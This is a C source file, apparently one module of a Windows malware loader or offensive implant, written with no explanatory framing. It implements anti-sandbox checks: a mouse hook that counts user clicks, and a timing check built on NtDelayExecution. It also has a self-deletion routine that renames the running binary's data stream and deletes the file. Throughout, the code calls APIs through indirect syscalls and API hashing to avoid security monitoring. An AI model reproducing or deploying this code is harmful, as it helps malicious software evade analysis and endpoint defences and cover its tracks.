#include <Windows.h>
#include <stdio.h>
#include "Common.h"
#include "Debug.h"

HHOOK g_hMouseHook = NULL;

DWORD g_dwMouseClicks = NULL;

extern VX_TABLE g_Sys;
extern API_HASHING g_Api;

LRESULT CALLBACK HookEvent(INT nCode, WPARAM wParam, LPARAM lParam) {

	if (wParam == WM_LBUTTONDOWN || wParam == WM_RBUTTONDOWN || wParam == WM_MBUTTONDOWN) {
#ifdef DEBUG
		PRINTA("[+] Mouse Click Recorded \n");
#endif
		g_dwMouseClicks++;
	}

	return g_Api.pCallNextHookEx(g_hMouseHook, nCode, wParam, lParam);
}

BOOL MouseClicksLogger() {

	MSG 	Msg = { 0 };

	g_hMouseHook = g_Api.pSetWindowsHookExW(
		WH_MOUSE_LL,
		(HOOKPROC)HookEvent,
		NULL,
		NULL
	);
	if (!g_hMouseHook) {
#ifdef DEBUG
		PRINTA("[!] SetWindowsHookExW Failed With Error : %d \n", GetLastError());
#endif
	}

	while (g_Api.pGetMessageW(&Msg, NULL, NULL, NULL)) {
		g_Api.pDefWindowProcW(Msg.hwnd, Msg.message, Msg.wParam, Msg.lParam);
	}

	return TRUE;
}

BOOL DeleteSelf() {

	WCHAR				    szPath[MAX_PATH * 2] = { 0 };
	FILE_DISPOSITION_INFO	Delete = { 0 };
	HANDLE				    hFile = INVALID_HANDLE_VALUE;
	PFILE_RENAME_INFO		pRename = NULL;
	CONST PWCHAR NewStream = (CONST PWCHAR)NEW_STREAM;
	SIZE_T				    sRename = sizeof(FILE_RENAME_INFO) + sizeof(NewStream);

	pRename = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sRename);
	if (!pRename) {
#ifdef DEBUG
		PRINTA("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
#endif
		return FALSE;
	}

	ZeroMemory(szPath, sizeof(szPath));
	ZeroMemory(&Delete, sizeof(FILE_DISPOSITION_INFO));

	Delete.DeleteFile = TRUE;

	pRename->FileNameLength = sizeof(NewStream);
	RtlCopyMemory(pRename->FileName, NewStream, sizeof(NewStream));

	if (g_Api.pGetModuleFileNameW(NULL, szPath, MAX_PATH * 2) == 0) {
#ifdef DEBUG
		PRINTA("[!] GetModuleFileNameW Failed With Error : %d \n", GetLastError());
#endif
		return FALSE;
	}

	hFile = g_Api.pCreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
#ifdef DEBUG
		PRINTA("[!] CreateFileW [R] Failed With Error : %d \n", GetLastError());
#endif
		return FALSE;
	}
#ifdef DEBUG
	PRINTW(L"[i] Renaming :$DATA to %s  ...", NEW_STREAM);
#endif

	if (!g_Api.pSetFileInformationByHandle(hFile, FileRenameInfo, pRename, sRename)) {
#ifdef DEBUG
		PRINTA("[!] SetFileInformationByHandle [R] Failed With Error : %d \n", GetLastError());
#endif
		return FALSE;
	}
#ifdef DEBUG
	PRINTW(L"[+] DONE \n");
#endif

	ConfS(g_Sys.NtClose.wSysC);
	RunSys(hFile);

	hFile = g_Api.pCreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
	if (hFile == INVALID_HANDLE_VALUE && GetLastError() == ERROR_FILE_NOT_FOUND) {
		return TRUE;
	}
	if (hFile == INVALID_HANDLE_VALUE) {
#ifdef DEBUG
		PRINTA("[!] CreateFileW [D] Failed With Error : %d \n", GetLastError());
#endif
		return FALSE;
	}

#ifdef DEBUG
	PRINTW(L"[i] DELETING ...");
#endif

	if (!g_Api.pSetFileInformationByHandle(hFile, FileDispositionInfo, &Delete, sizeof(Delete))) {
#ifdef DEBUG
		PRINTA("[!] SetFileInformationByHandle [D] Failed With Error : %d \n", GetLastError());
#endif
		return FALSE;
	}
#ifdef DEBUG
	PRINTW(L"[+] DONE \n");
#endif

	ConfS(g_Sys.NtClose.wSysC);
	RunSys(hFile);

	HeapFree(GetProcessHeap(), 0, pRename);

	return TRUE;
}


BOOL DelayExecutionVia_NtDE(FLOAT ftMinutes) {

	DWORD                   dwMilliSeconds = ftMinutes * 60000;
	LARGE_INTEGER           DelayInterval = { 0 };
	LONGLONG                Delay = NULL;
	NTSTATUS                STATUS = NULL;
	DWORD                   _T0 = NULL,
		_T1 = NULL;

	Delay = dwMilliSeconds * 10000;
	DelayInterval.QuadPart = -Delay;

	_T0 = g_Api.pGetTickCount64();

	ConfS(g_Sys.NtDelayExecution.wSysC);
	if ((STATUS = RunSys(FALSE, &DelayInterval)) != 0x00 && STATUS != STATUS_TIMEOUT) {
#ifdef DEBUG
		PRINTA("[!] NtDelayExecution Failed With Error : 0x%0.8X \n", STATUS);
#endif
		return FALSE;
	}

	_T1 = g_Api.pGetTickCount64();

	if ((DWORD)(_T1 - _T0) < dwMilliSeconds)
		return FALSE;

#ifdef DEBUG
	PRINTA("\n\t>> _T1 - _T0 = %d \n", (DWORD)(_T1 - _T0));

	PRINTA("[+] DONE \n");
#endif

	return TRUE;
}

BOOL AntiAnalysis(DWORD dwMilliSeconds) {

	HANDLE					hThread = NULL;
	NTSTATUS				STATUS = NULL;
	LARGE_INTEGER			DelayInterval = { 0 };
	FLOAT					i = 1;
	LONGLONG				Delay = NULL;

	Delay = dwMilliSeconds * 10000;
	DelayInterval.QuadPart = -Delay;

	while (i <= 10) {

#ifdef DEBUG
		PRINTA("[#] Monitoring Mouse-Clicks For %d Seconds - Need 6 Clicks To Pass\n", (dwMilliSeconds / 1000));
#endif

		ConfS(g_Sys.NtCreateThreadEx.wSysC);
		if ((STATUS = RunSys(&hThread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, MouseClicksLogger, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {
#ifdef DEBUG
			PRINTA("[!] NtCreateThreadEx Failed With Error : 0x%0.8X \n", STATUS);
#endif
			return FALSE;
		}

		ConfS(g_Sys.NtWaitForSingleObject.wSysC);
		if ((STATUS = RunSys(hThread, FALSE, &DelayInterval)) != 0 && STATUS != STATUS_TIMEOUT) {
#ifdef DEBUG
			PRINTA("[!] NtWaitForSingleObject Failed With Error : 0x%0.8X \n", STATUS);
#endif
			return FALSE;
		}

		ConfS(g_Sys.NtClose.wSysC);
		if ((STATUS = RunSys(hThread)) != 0) {
#ifdef DEBUG
			PRINTA("[!] NtClose Failed With Error : 0x%0.8X \n", STATUS);
#endif
			return FALSE;
		}

		if (g_hMouseHook && !g_Api.pUnhookWindowsHookEx(g_hMouseHook)) {
#ifdef DEBUG
			PRINTA("[!] UnhookWindowsHookEx Failed With Error : %d \n", GetLastError());
#endif
			return FALSE;
		}

		if (!DelayExecutionVia_NtDE((FLOAT)(i / 2)))
			return FALSE;

		if (g_dwMouseClicks > 5)
			return TRUE;

		g_dwMouseClicks = NULL;

		i++;
	}

	return FALSE;
}